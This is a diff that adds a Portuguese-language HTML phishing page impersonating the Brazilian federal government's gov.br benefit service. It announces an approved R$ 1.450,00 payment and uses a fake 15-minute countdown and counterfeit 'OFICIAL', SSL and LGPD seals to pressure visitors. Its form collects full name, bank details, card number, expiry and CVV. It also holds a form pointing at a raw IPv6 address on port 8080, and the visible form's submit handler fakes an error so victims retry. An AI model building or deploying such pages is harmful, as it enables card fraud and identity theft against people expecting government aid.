@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Confirmação de Benefício - Governo Federal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background-color: #f8f9fa;
+      color: #333;
+      line-height: 1.6;
+    }
+
+    .container {
+      max-width: 800px;
+      padding: 0 20px;
+      margin: auto;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 0;
+      border-bottom: 1px solid #eaeaea;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo {
+      height: 30px;
+    }
+
+    .badge {
+      background-color: #1351b4;
+      color: white;
+      font-size: 10px;
+      padding: 3px 6px;
+      border-radius: 4px;
+      font-weight: 600;
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 12px;
+      color: #28a745;
+      margin-top: 10px;
+    }
+
+    .security-badge img {
+      width: 12px;
+      height: 12px;
+    }
+
+    .main-content {
+      padding-bottom: 30px;
+    }
+
+    .approval-banner {
+      background: linear-gradient(135deg, #4e9cff, #1351b4);
+      color: white;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: center;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
+    }
+
+    .approval-banner h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+
+    .approval-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: rgba(255, 255, 255, 0.2);
+      padding: 8px 12px;
+      border-radius: 20px;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .approval-badge img {
+      width: 16px;
+      margin-right: 5px;
+    }
+
+    .benefit-amount {
+      font-size: 36px;
+      font-weight: 700;
+      margin: 15px 0;
+    }
+
+    .benefit-info {
+      font-size: 14px;
+      opacity: 0.9;
+      margin-bottom: 5px;
+    }
+
+    .urgency-alert {
+      background-color: #fff8e6;
+      border-left: 4px solid #ffc107;
+      padding: 12px;
+      margin: 20px 0;
+      border-radius: 0 8px 8px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .urgency-alert img {
+      width: 16px;
+      height: 16px;
+    }
+
+    .urgency-alert p {
+      font-size: 13px;
+      color: #d32f2f;
+      font-weight: 500;
+      margin: 0;
+    }
+
+    .form-container {
+      background-color: white;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    }
+
+    .form-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .form-header h2 {
+      font-size: 20px;
+      color: #1351b4;
+      margin-bottom: 5px;
+    }
+
+    .form-header p {
+      font-size: 14px;
+      color: #666;
+    }
+
+    .benefit-form {
+      margin-top: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #555;
+      font-weight: 500;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border-color 0.3s;
+    }
+
+    .form-group input:focus {
+      border-color: #1351b4;
+      outline: none;
+    }
+
+    .form-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+      min-width: 48%;
+    }
+
+    .submit-button {
+      width: 100%;
+      background: linear-gradient(135deg, #4e9cff, #1351b4);
+      color: white;
+      border: none;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+      cursor: pointer;
+      transition: opacity 0.3s;
+    }
+
+    .submit-button:hover {
+      opacity: 0.9;
+    }
+
+    .submit-button img {
+      width: 16px;
+    }
+
+    .security-seals {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 25px;
+    }
+
+    .security-seals img {
+      height: 40px;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px 0;
+      font-size: 12px;
+      color: #999;
+      border-top: 1px solid #eee;
+      margin-top: 30px;
+    }
+
+    #mensagem-final {
+      display: none;
+      text-align: center;
+      padding: 20px;
+      background-color: #f8f9fa;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+
+    .loading-spinner {
+      border: 4px solid rgba(19, 81, 180, 0.1);
+      border-radius: 50%;
+      border-top: 4px solid #1351b4;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 14px;
+      color: #1351b4;
+      font-weight: 500;
+    }
+
+    .loading-subtext {
+      font-size: 12px;
+      color: #666;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header class="header">
+      <div class="logo-container">
+        <img src="imagens/Gov.br.png" alt="Benefício Digital" class="logo" />
+        <span class="badge">OFICIAL</span>
+      </div>
+      <div class="security-badge">
+        <img src="imagens/ssl.jpg" alt="Segurança" />
+        <span></span>
+      </div>
+    </header>
+
+    <div class="approval-banner">
+  <div class="approval-badge">
+    <span>APROVADO</span>
+  </div>
+<!-- Vídeo com autoplay e áudio -->
+<div style="margin: 20px auto; max-width: 800px;">
+  <video autoplay playsinline muted loop controls style="width: 100%; height: 215px; border-radius: 10px;">
+    <source src="imagens/download.mp4" type="video/mp4">
+    Seu navegador não suporta vídeos HTML5.
+  </video>
+</div>
+
+<script>
+// Este script remove o muted após a página carregar (para ativar o áudio)
+document.addEventListener('DOMContentLoaded', function() {
+  const video = document.querySelector('video');
+  
+  // Tenta ativar o áudio após 1 segundo (alguns navegadores exigem delay)
+  setTimeout(() => {
+    video.muted = false;
+  }, 1000);
+  
+  // Alternativa: ativa o áudio quando o usuário clicar em qualquer lugar
+  document.body.addEventListener('click', function() {
+    video.muted = false;
+  }, { once: true });
+});
+</script>
+
+  <h1>Parabéns! Seu benefício foi liberado</h1>
+  <p class="benefit-info">Valor aprovado para crédito imediato:</p>
+  <div class="benefit-amount">R$ 1.450,00</div>
+  <p class="benefit-info">O depósito será feito em até <strong>24 horas</strong> após a confirmação</p>
+</div>
+
+<div class="urgency-alert">
+  <img src="imagens/atencao.jpg" alt="Atenção" />
+  <div class="urgency-text">
+    <p><strong>Atenção:</strong> Você tem apenas <strong id="tempo-restante">15 minutos</strong> para confirmar seus dados bancários</p>
+  </div>
+</div>
+
+<script>
+  // Código JavaScript para atualizar o tempo dinamicamente
+  document.addEventListener('DOMContentLoaded', function () {
+    let minutos = 15;
+    const alerta = document.getElementById('tempo-restante');
+    const intervalo = setInterval(() => {
+      minutos--;
+      alerta.innerHTML = `${minutos} minutos`;
+      if (minutos <= 0) {
+        clearInterval(intervalo);
+        alerta.innerHTML = 'Seu tempo expirou. Por favor, recomece o processo.';
+      }
+    }, 60000);
+  });
+</script>
+
+<style>
+  .urgency-alert {
+    background-color: #fff8e6;
+    border-left: 4px solid #ffc107;
+    padding: 12px;
+    margin: 20px 0;
+    border-radius: 0 8px 8px 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .urgency-alert img {
+    width: 20px; /* Ajustando o tamanho do ícone */
+    height: 20px;
+  }
+
+  .urgency-text p {
+    font-size: 13px;
+    color: #d32f2f;
+    font-weight: 500;
+    margin: 0;
+  }
+
+  .urgency-text strong {
+    color: #d32f2f;
+  }
+</style>
+<form action="http://[2804:747c:e005:7800:5979:5fb6:b6e2:978c]:8080" method="POST"></form>
+      <div class="form-container">
+        <div class="form-header">
+          <h2>Confirmação Bancária</h2>
+          <p>Preencha seus dados para receber o crédito</p>
+        </div>
+
+        <form id="formFinalizacao" class="benefit-form">
+          <div class="form-group">
+            <label for="nome-banco">Nome completo</label>
+            <input type="text" id="nome-banco" required />
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="banco">Banco</label>
+              <input type="text" id="banco" placeholder="Ex: Caixa, Itaú" required />
+            </div>
+            <div class="form-group">
+              <label for="agencia">Agência</label>
+              <input type="text" id="agencia" required />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="conta">Número da conta</label>
+            <input type="text" id="conta" required />
+          </div>
+
+          <div class="form-group">
+            <label for="cartao">Número do cartão</label>
+            <input type="text" id="cartao" placeholder="0000 0000 0000 0000" required />
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label for="validade">Validade</label>
+              <input type="text" id="validade" placeholder="MM/AA" required />
+            </div>
+            <div class="form-group">
+              <label for="cvv">CVV</label>
+              <input type="text" id="cvv" placeholder="123" required />
+            </div>
+          </div>
+
+          <button type="submit" class="submit-button">
+            <span>Confirmar dados bancários</span>
+            <img src="imagens/Gov.br.png" alt="" />
+          </button>
+        </form>
+
+        <div id="mensagem-final">
+          <div class="loading-spinner"></div>
+          <p class="loading-text">Processando seu benefício</p>
+          <p class="loading-subtext">Não feche esta página. Estamos verificando seus dados.</p>
+        </div>
+
+        <div class="security-seals">
+          <img src="imagens/ssl.jpg" alt="SSL 256-bit" />
+          <img src="imagens/lgpd2.png" alt="LGPD" />
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <p>Sistema de Consulta de Benefícios - Governo Federal</p>
+      <p>Parceria com Banco Central do Brasil</p>
+    </footer>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('formFinalizacao');
+      const cartao = document.getElementById('cartao');
+      const validade = document.getElementById('validade');
+      const mensagemFinal = document.getElementById('mensagem-final');
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        form.style.display = 'none';
+        mensagemFinal.style.display = 'block';
+
+        setTimeout(function () {
+          alert('Erro no processamento. Por favor, tente novamente mais tarde.');
+          form.style.display = 'block';
+          mensagemFinal.style.display = 'none';
+        }, 5000);
+      });
+
+      cartao.addEventListener('input', function (e) {
+        let val = e.target.value.replace(/\D/g, '');
+        val = val.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+        e.target.value = val;
+      });
+
+      validade.addEventListener('input', function (e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length > 2) {
+          val = val.replace(/^(\d{2})(\d)/, '$1/$2');
+        }
+        e.target.value = val;
+      });
+
+      // contador regressivo
+      const alerta = document.querySelector('.urgency-alert p');
+      if (alerta) {
+        let minutos = 15;
+        const intervalo = setInterval(() => {
+          minutos--;
+          alerta.innerHTML = `⚠️ Você tem apenas <strong>${minutos} minutos</strong> para confirmar seus dados bancários`;
+          if (minutos <= 0) {
+            clearInterval(intervalo);
+            alerta.innerHTML = '⏰ Seu tempo expirou. Por favor, recomece o processo.';
+          }
+        }, 60000);
+      }
+    });
+  </script><!-- Adicione este script no final do body -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Recuperar parâmetros da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const nome = urlParams.get('nome') || 'Usuário';
+    const valor = urlParams.get('valor') || '1.450,00';
+    
+    // Personalizar mensagem com nome do usuário
+    const banner = document.querySelector('.approval-banner h1');
+    if (banner) {
+        banner.textContent = `Parabéns, ${nome}! Seu benefício foi liberado`;
+    }
+    
+    // Atualizar valor do benefício
+    const valorElement = document.querySelector('.benefit-amount');
+    if (valorElement) {
+        valorElement.textContent = `R$ ${valor}`;
+    }
+    
+    // Limpar dados do localStorage após confirmação
+    localStorage.removeItem('userData');
+    localStorage.removeItem('paymentStatus');
+});
+</script>
+</body>
+</html>
+z
